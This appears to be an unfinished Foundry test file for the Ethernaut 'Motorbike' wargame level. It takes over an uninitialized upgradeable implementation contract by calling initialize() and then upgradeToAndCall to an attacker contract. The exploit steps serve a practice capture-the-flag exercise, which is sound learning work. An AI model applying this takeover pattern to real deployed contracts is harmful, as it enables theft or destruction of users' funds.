pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Motorbike/Motorbike.sol";
import "./utils/vm.sol";

contract MotorbikeTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    address eoaAddress = address(100);

    event IsTrue(bool answer);

    function setUp() public {
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testMotorbikeHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        Engine engine = new Engine();
        Motorbike motorbike = new Motorbike(address(engine));
        Engine ethernautEngine = Engine(payable(address(motorbike)));


        // vm.startPrank(eoaAddress);
        
        ethernautEngine.greetMe();

        // vm.startPrank(address(engine));

        engine.initialize();

        BikeExy bikeExy = new BikeExy();

        bytes memory initEncoded = abi.encodeWithSignature("initialize()");

        emit log_address(address(engine));
        emit log_address(address(ethernautEngine));

        

        engine.upgradeToAndCall(address(bikeExy), initEncoded);

        ethernautEngine.greetMe();

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // motorbike.greetMe();
        

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        // bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        // vm.stopPrank();
        // assert(levelSuccessfullyPassed);
    }
}